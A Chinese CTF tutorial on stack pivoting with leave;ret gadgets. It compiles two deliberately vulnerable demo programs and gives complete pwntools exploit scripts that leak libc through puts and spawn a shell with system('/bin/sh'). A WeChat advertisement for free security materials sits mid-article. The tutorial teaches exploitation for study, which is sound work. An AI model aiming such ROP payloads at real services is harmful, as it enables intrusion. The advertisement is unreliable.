## 一、前言

现在的CTF比赛中很难在大型比赛中看到栈溢出类型的赛题，而即使遇到了也是多种利用方式组合出现，尤其以栈迁移配合其他利用方式来达到组合拳的效果，本篇文章意旨通过原理+例题的形式带领读者一步步理解栈迁移的原理以及在ctf中的应用。

## 二、前置知识

在笔者看来栈迁移的原理其实可以总结为一句话：因为栈溢出字节过少所以劫持`rsp`寄存器指向攻击者提前布置好`payload`的内存地址，已达到扩充溢出字节数的目的。​
以一个简单的`demo1`为例，程序源码以及编译指令如下所示：

    
    
    #include <stdio.h>  
    ​  
    char buf1[0x100];  
    ​  
    void main() {  
    char buf2[0x40];  
    puts("First: ");  
    read(0, buf1, 0x100);  
    puts("Second: ");  
    read(0, buf2, 0x60);  
    ​  
    }  
    // gcc -fno-stack-protector -no-pie -z lazy -o demo1 demo1.c

程序的流程非常简单存在两个输出，第一次是往全局变量`buf1`第二次是往局部变量`buf2`中写入。可以看到在第二次写入时存在明显的栈溢出漏洞，但是溢出的字节数只够写入`0x18`大小的字节，如果要构造gadget泄露内存地址，最短的ROP链也需要`0x20`的字节才可以在泄露内存后返回输入点继续执行程序。

![image-20220726104834218.png](https://image.3001.net/images/20220727/1658911929_62e0fcb9f0ee7dc913114.png!small)

在这种情况就可以使用栈迁移的方式来扩大溢出字节数的大小，在前面说过栈迁移的本质就是劫持`rsp`寄存器指向攻击者提前布置好`payload`的内存地址，而劫持`rsp`寄存器的指令有很多，最常用的就是函数的退栈返回指令`leave;
ret`。​ 可以分成两部分来理解这条指令。首先执行的是`leave`指令，这条指令共执行了两个操作`mov rsp, rbp`和`pop
rbp`，其中`rsp`寄存器的指向变化如下图所示，可以看到在执行完`leave`指令后`rsp`寄存器指向了返回地址；随后会执行`ret`指令，这条指令可以理解成`pop
rip`。因为此时`rsp`寄存器指向`rbp+8`即函数的返回地址，所以`pop`给`rip`寄存器的就是函数的返回地址，退栈完成。

![image-20220726110625946.png](https://image.3001.net/images/20220727/1658911930_62e0fcbac7d10b8940b44.png!small)

在了解这条指令后不难发现，如果利用溢出漏洞可以覆盖rbp的值为一个已知地址，那么在执行过两次`leave;
ret`指令后，就可以劫持`rsp`寄存器到任意地址，此时`rsp`寄存器指向的地址即为新的栈地址，只要事先在新地址处布置好想要执行的`rop
gadget`，那么溢出字节过少这个问题就迎刃而解了。

![image-20220726115139278.png](https://image.3001.net/images/20220727/1658911931_62e0fcbb9849e328a5e10.png!small)

根据上面介绍的栈迁移原理，可以总结出使用栈迁移的一些必要条件

  1. 存在可以劫持程序流和控制rbp寄存器的漏洞

  2. 攻击者可以确定准确某一块具有读写权限的地址

  3. 在进行栈迁移前需要在这块地址上进行`rop gadget`布局

  

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 三、例题讲解

### 3.1 例题demo1

在理解了栈迁移的原理后可以通过这个demo来练练手了，进行编译时未开启`Canary`和`PIE`保护，NX保护开启防止写入`shellcode`

![image-20220726150444213.png](https://image.3001.net/images/20220727/1658911932_62e0fcbc61dd45b92dcac.png!small)

这里先将大体的利用思路总结出来，其中的实现细节实现会在下文中进行说明。

  * 未开启`PIE`保护，可以确定第一次写入的地址记作`addr1`，在此地址处布置`rop gadget`来实现泄露`LIBC地址`并返回主函数

  * 利用第二次写入存在的栈溢出漏洞覆盖`rbp`为`addr1`，`rip`为指令`leave; ret`的地址实现栈迁移

  * 返回主函数后利用`ret2libc`执行`system("/bin/sh")`获取shell

#### 3.1.1 栈迁移布局

首先我们利用第一次输入进行`rop chain`布局，并利用第二次栈溢出漏洞覆盖rbp为伪栈地址劫持rip为`leave;
ret`指令地址，内存变化如下图所示。​ 细心的同学会发现，我们在第一次进行`rop
chain`布局前有一小段`padding`填充在前面，这是因为在我们进行栈迁移后，程序指令中所有对于栈的操作都会在伪栈内进行，而伪栈地址与`got`表地址相邻，填入这小段`padding`的目的就是为了避免程序在对伪栈进行读写数据时造成内存数据段内关键信息被覆盖，从而造成`crash`现象。

![image-20220726204247032.png](https://image.3001.net/images/20220727/1658911933_62e0fcbd239588a241fae.png!small)

在汇编中当我们要对局部变量进行操作时，一般都是用`rbp`栈底寄存器来定位，如下图所示。这一点在栈迁移中可以让我们构造出一个类似于链表的利用结构，每次布置`rop
chain`时不断将`rbp`寄存器赋值为伪栈地址，然后跳转到主函数的写入函数处，因为局部变量寻址是通过rbp寄存器，所以我们可以不断进行`rop
chain`的布局。​ 在第一次进行`rop
chain`的布局中控制`rbp`寄存器指向新的伪栈地址，那么在返回主函数后执行`read`函数时，写入地址就是新的伪栈地址，这时只要利用栈溢出漏洞去构造`ret2libc`即可getshell。

![image-20220726211402916.png](https://image.3001.net/images/20220727/1658911933_62e0fcbddf352530a76ec.png!small)

#### 3.1.2 EXP

    
    
    from pwn import *  
    ​  
    p = process('./demo1')  
    libc = ELF('./demo1').libc  
    ​  
    fake_stack = 0x601060  
    leave_ret = 0x40058E  
    puts_plt = 0x400430  
    puts_got = 0x601018  
    pop_rdi = 0x4005f3  
    read_text = 0x400572  
    ​  
    payload1 = "a"*0x78+p64(fake_stack+0x408)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read_text)  
    p.sendafter('First:', payload1)  
    payload2 = 'a'*0x40+p64(fake_stack+0x78)+p64(leave_ret)  
    p.sendafter('Second:', payload2)  
    ​  
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))  
    libc_base = puts_addr - libc.sym['puts']  
    system = libc_base+libc.sym['system']  
    sh = libc_base+libc.search('/bin/sh').next()  
    success(hex(libc_base))  
    ​  
    payload3 = "a"*0x48+p64(pop_rdi)+p64(sh)+p64(system)  
    p.send(payload3)  
    p.interactive()

### 3.2 例题demo2

在CTF比赛中通常只有一次写入机会，这边给出`demo2`的源码以及编译命令。

    
    
    # include <stdio.h>  
    # include <string.h>  
    void main() {  
    char buf[0x28];  
    puts("Hello Hacker.");  
      
    read(0, buf, 0x40);  
    }  
    // gcc -fno-stack-protector -no-pie -z lazy -o demo2 demo2.c

与`demo1`一样`demo2`未开启`Canary`与`PIE`保护，不同的是`demo2`中只有一次输入机会，并且溢出字节数只能覆盖返回地址。​
结合之前讲解的栈迁移技巧，首先在劫持`rsp`前需要进行`rop
chain`布局，程序并没有一次可以往伪栈布局的机会，但是可以利用劫持程序流的方式来构造这一条件。​
观察程序的汇编代码如下图所示，在对局部变量buf进行寻址时使用了`rbp`寄存器，那么我们可以利用这一点配合栈溢出漏洞来实现伪栈上的`rop`布局。利用思路如下所示，其中的实现细节实现会在下文中进行说明。

  1. 利用栈溢出漏洞劫持`rbp`寄存器为伪栈地址，返回地址为`0x40054b`(图中主程序的输入函数)，即可在返回主程序后对伪栈进行`rop chain`的布局

  2. 对伪栈进行`rop chain`的布局，泄露LIBC地址并返回主函数

  3. 返回主函数后利用栈溢出漏洞配合`栈迁移`+`ret2libc`完成getshell

![image-20220726221209703.png](https://image.3001.net/images/20220727/1658911934_62e0fcbeaf0d0aca9d3f4.png!small)

#### 3.2.1 伪栈rop布局

第一次`leave;
ret`是主函数退栈时执行的，利用栈溢出漏洞覆盖`rbp`为伪栈地址，`rsp`为主函数地址。当我们再次来到主函数的输入函数时即可在伪栈上布置`rop
chain`。此时的内存变化如下图所示

![image-20220726224554713.png](https://image.3001.net/images/20220727/1658911935_62e0fcbf62a2a1ec1747d.png!small)

第二次`leave; ret`指令依然来自主函数退栈时执行，在伪栈上布置好`rop
chain`后程序执行退栈操作，此时`rbp`寄存器内保存`fack_stack-0x30`的地址即`rop
chain`地址+`0x8`的位置处，`rsp`寄存器被劫持到伪栈上，此时的内存变化如下图所示

![image-20220726225131346.png](https://image.3001.net/images/20220727/1658911936_62e0fcc02d3c683f3c6bc.png!small)

这里为什么是`fake_stack-0x30`的地址呢？因为在对局部变量`buf`进行寻址时使用到`rbp`寄存器，而本题中的`buf`地址来自`[rbp-0x30]`的地址，所以如果想要将rsp劫持到`rop
chain`的位置，就需要对`rbp`寄存器赋值为`fakc_stack-0x30`，那么在执行第三次leave的时候，`rsp`寄存器就劫持到`rop
chain`的地址处，此时的内存变化如下图所示

![image-20220726234500873.png](https://image.3001.net/images/20220727/1658911937_62e0fcc12e2a013ce21f7.png!small)

![image-20220726225629456.png](https://image.3001.net/images/20220727/1658911938_62e0fcc2145ce7009633d.png!small)

泄露完LIBC地址后，劫持程序流返回主函数，利用`read`函数对伪栈进行最后一次`rop`布局，需要注意此时的写入地址是`fake_stack-0x30`，所以在栈迁移时`rbp`寄存器的值为`fake_stack-0x30-0x30-0x8`的地址处，再执行一次`leave;
ret`时即可将`rsp`寄存器劫持到`ret2libc rop`地址处。内存变化如下图所示

![image-20220726233002327.png](https://image.3001.net/images/20220727/1658911938_62e0fcc2c37a3b281c6bc.png!small)

#### 3.2.2 EXP

> from pwn import *  
> context.log_level = 'debug'  
> ​  
> p = process('./demo1')  
> libc = ELF('./demo1').libc  
> ​  
> read_text = 0x40054B  
> fake_rbp = 0x601500  
> pop_rdi = 0x4005d3 # pop rdi; ret;  
> puts_plt = 0x400430  
> puts_got = 0x601018  
> leave_ret = 0x400567  
> ​  
> # gdb.attach(p, 'b *0x400567')  
> ​  
> payload1 = 'a'*0x30+p64(fake_rbp)+p64(read_text)  
> p.sendafter("Hello Hacker.", payload1)  
> ​  
> payload2 =
> p64(fake_rbp-0x30)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read_text)+p64(0)+p64(fake_rbp-0x30)+p64(leave_ret)  
> p.send(payload2)  
> ​  
> puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))  
> libc_base = puts_addr - libc.sym['puts']  
> system = libc_base+libc.sym['system']  
> sh = libc_base+libc.search('/bin/sh').next()  
> success(hex(libc_base))  
> ​  
> payload3 =
> p64(pop_rdi)+p64(sh)+p64(system)+p64(0)*3+p64(fake_rbp-0x68)+p64(leave_ret)  
> p.send(payload3)  
> p.interactive()

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

